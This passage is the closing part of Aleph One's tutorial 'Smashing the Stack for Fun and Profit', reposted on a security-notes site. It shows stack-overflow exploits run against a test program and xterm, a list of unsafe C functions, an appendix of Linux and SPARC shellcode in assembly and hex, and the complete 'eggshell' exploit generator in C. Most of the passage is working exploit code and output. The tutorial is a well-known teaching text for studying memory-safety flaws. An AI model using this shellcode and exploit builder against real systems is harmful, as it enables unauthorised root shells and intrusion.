------------------------------------------------------------------------------

   Lets try our new exploit with our vulnerable test program:

------------------------------------------------------------------------------
[aleph1]$ ./exploit4 768
Using address: 0xbffffdb0
[aleph1]$ ./vulnerable $RET
$
------------------------------------------------------------------------------

   Works like a charm. Now lets try it on xterm:

------------------------------------------------------------------------------
[aleph1]$ export DISPLAY=:0.0
[aleph1]$ ./exploit4 2148
Using address: 0xbffffdb0
[aleph1]$ /usr/X11R6/bin/xterm -fg $RET
Warning: Color name
&quot;°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤








ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°








¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿








°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ








¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤








ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°








¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿








°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ








¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤








ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿ¿°¤ÿÿ¿°¤ÿ¿








°¤ÿ¿°¤ÿ¿°¤
Warning: some arguments in previous message were lost
$
------------------------------------------------------------------------------

   On the first try!  It has certainly increased our odds.  Depending how 
much environment data the exploit program has compared with the program 
you are trying to exploit the guessed address may be to low or to high. 
Experiment both with positive and negative offsets.


                              Finding Buffer Overflows
                              ~~~~~~~~~~~~~~~~~~~~~~~~

   As stated earlier, buffer overflows are the result of stuffing more
information into a buffer than it is meant to hold.  Since C does not have any
built-in bounds checking, overflows often manifest themselves as writing past
the end of a character array.  The standard C library provides a number of
functions for copying or appending strings, that perform no boundary checking.
They include: strcat(), strcpy(), sprintf(), and vsprintf(). These functions 
operate on null-terminated strings, and do not check for overflow of the 
receiving string.  gets() is a function that reads a line from stdin into 
a buffer until either a terminating newline or EOF.  It performs no checks for
buffer overflows.  The scanf() family of functions can also be a problem if 
you are matching a sequence of non-white-space characters (%s), or matching a 
non-empty sequence of characters from a specified set (%[]), and the array 
pointed to by the char pointer, is not large enough to accept the whole 
sequence of characters, and you have not defined the optional maximum field 
width.  If the target of any of these functions is a buffer of static size, 
and its other argument was somehow derived from user input there is a good
posibility that you might be able to exploit a buffer overflow.

   Another usual programming construct we find is the use of a while loop to
read one character at a time into a buffer from stdin or some file until the
end of line, end of file, or some other delimiter is reached.  This type of
construct usually uses one of these functions: getc(), fgetc(), or getchar().
If there is no explicit checks for overflows in the while loop, such programs 
are easily exploited.

   To conclude, grep(1) is your friend.  The sources for free operating
systems and their utilities is readily available.  This fact becomes quite
interesting once you realize that many comercial operating systems utilities
where derived from the same sources as the free ones.  Use the source d00d.


     Appendix A - Shellcode for Different Operating Systems/Architectures
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

i386/Linux
------------------------------------------------------------------------------
        jmp    0x1f
        popl   %esi
        movl   %esi,0x8(%esi)
        xorl   %eax,%eax
    movb   %eax,0x7(%esi)
        movl   %eax,0xc(%esi)
        movb   $0xb,%al
        movl   %esi,%ebx
        leal   0x8(%esi),%ecx
        leal   0xc(%esi),%edx
        int    $0x80
        xorl   %ebx,%ebx
        movl   %ebx,%eax
        inc    %eax
        int    $0x80
        call   -0x24
        .string \&quot;/bin/sh\&quot;
------------------------------------------------------------------------------

SPARC/Solaris
------------------------------------------------------------------------------
        sethi   0xbd89a, %l6
        or      %l6, 0x16e, %l6
        sethi   0xbdcda, %l7
        and     %sp, %sp, %o0
        add     %sp, 8, %o1
        xor     %o2, %o2, %o2
        add     %sp, 16, %sp
        std     %l6, [%sp - 16]
        st      %sp, [%sp - 8]
        st      %g0, [%sp - 4]
        mov     0x3b, %g1
        ta      8
        xor     %o7, %o7, %o0
        mov     1, %g1
        ta      8
------------------------------------------------------------------------------

SPARC/SunOS
------------------------------------------------------------------------------
        sethi   0xbd89a, %l6
        or      %l6, 0x16e, %l6
        sethi   0xbdcda, %l7
        and     %sp, %sp, %o0
        add     %sp, 8, %o1
        xor     %o2, %o2, %o2
        add     %sp, 16, %sp
        std     %l6, [%sp - 16]
        st      %sp, [%sp - 8]
        st      %g0, [%sp - 4]
        mov     0x3b, %g1
    mov -0x1, %l5
        ta      %l5 + 1
        xor     %o7, %o7, %o0
        mov     1, %g1
        ta      %l5 + 1
------------------------------------------------------------------------------


                 Appendix B - Generic Buffer Overflow Program
                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

shellcode.h
------------------------------------------------------------------------------
#if defined(__i386__) &amp;&amp; defined(__linux__)

#define NOP_SIZE    1
char nop[] = &quot;\x90&quot;;
char shellcode[] =
  &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
  &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
  &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;

unsigned long get_sp(void) {
   __asm__(&quot;movl %esp,%eax&quot;);
}

#elif defined(__sparc__) &amp;&amp; defined(__sun__) &amp;&amp; defined(__svr4__)

#define NOP_SIZE    4
char nop[]=&quot;\xac\x15\xa1\x6e&quot;;
char shellcode[] =
  &quot;\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e&quot;
  &quot;\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0&quot;
  &quot;\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08&quot;
  &quot;\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08&quot;;

unsigned long get_sp(void) {
  __asm__(&quot;or %sp, %sp, %i0&quot;);
}

#elif defined(__sparc__) &amp;&amp; defined(__sun__)

#define NOP_SIZE        4
char nop[]=&quot;\xac\x15\xa1\x6e&quot;;
char shellcode[] =
  &quot;\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e&quot;
  &quot;\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0&quot;
  &quot;\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff&quot;
  &quot;\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01&quot;;

unsigned long get_sp(void) {
  __asm__(&quot;or %sp, %sp, %i0&quot;);
}

#endif
------------------------------------------------------------------------------

eggshell.c
------------------------------------------------------------------------------
/*
 * eggshell v1.0
 *
 * Aleph One / aleph1@underground.org
 */
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &quot;shellcode.h&quot;

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define DEFAULT_EGG_SIZE               2048

void usage(void);

void main(int argc, char *argv[]) {
  char *ptr, *bof, *egg;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE;

  while ((c = getopt(argc, argv, &quot;a:b:e:o:&quot;)) != EOF)
    switch (c) {
      case 'a':
        align = atoi(optarg);
        break;
      case 'b':
        bsize = atoi(optarg);
        break;
      case 'e':
        eggsize = atoi(optarg);
        break;
      case 'o':
        offset = atoi(optarg);
        break;
      case '?':
        usage();
        exit(0);
    }

  if (strlen(shellcode) &gt; eggsize) {
    printf(&quot;Shellcode is larger the the egg.\n&quot;);
    exit(0);
  }

  if (!(bof = malloc(bsize))) {
    printf(&quot;Can't allocate memory.\n&quot;);
    exit(0);
  }
  if (!(egg = malloc(eggsize))) {
    printf(&quot;Can't allocate memory.\n&quot;);
    exit(0);
  }

  addr = get_sp() - offset;
  printf(&quot;[ Buffer size:\t%d\t\tEgg size:\t%d\tAligment:\t%d\t]\n&quot;,
    bsize, eggsize, align);
  printf(&quot;[ Address:\t0x%x\tOffset:\t\t%d\t\t\t\t]\n&quot;, addr, offset);

  addr_ptr = (long *) bof;
  for (i = 0; i &lt; bsize; i+=4)
    *(addr_ptr++) = addr;

  ptr = egg;
  for (i = 0; i &lt;= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE)
    for (n = 0; n &lt; NOP_SIZE; n++) {
      m = (n + align) % NOP_SIZE;
      *(ptr++) = nop[m];
    }

  for (i = 0; i &lt; strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  bof[bsize - 1] = '\0';
  egg[eggsize - 1] = '\0';

  memcpy(egg,&quot;EGG=&quot;,4);
  putenv(egg);

  memcpy(bof,&quot;BOF=&quot;,4);
  putenv(bof);
  system(&quot;/bin/sh&quot;);
}

void usage(void) {
  (void)fprintf(stderr,
    &quot;usage: eggshell [-a &lt;alignment&gt;] [-b &lt;buffersize&gt;] [-e &lt;eggsize&gt;] [-o &lt;offset&gt;]\n&quot;);
}
------------------------------------------------------------------------------



</code></pre> <p>原文链接： <a href=https://insecure.org/stf/smashstack.html>https://insecure.org/stf/smashstack.html</a></p> </article> </div> </div> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=页脚> <a href=../%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/ class="md-footer__link md-footer__link--prev" aria-label="上一页: 巧用命令注入的N种方式" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 上一页 </span> 巧用命令注入的N种方式 </div> </div> </a> <a href=../../Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/ class="md-footer__link md-footer__link--next" aria-label="下一页: Bad Binder:Android In The Wild Exploit" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 下一页 </span> Bad Binder:Android In The Wild Exploit </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2022 - 3022 <span style=float:right><a href=http://beian.miit.gov.cn/ >鄂ICP备19027194号-2</a></span> </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "search": "../../assets/javascripts/workers/search.bd0b6b67.min.js"}</script> <script src=../../assets/javascripts/bundle.8aa65030.min.js></script> </body> </html>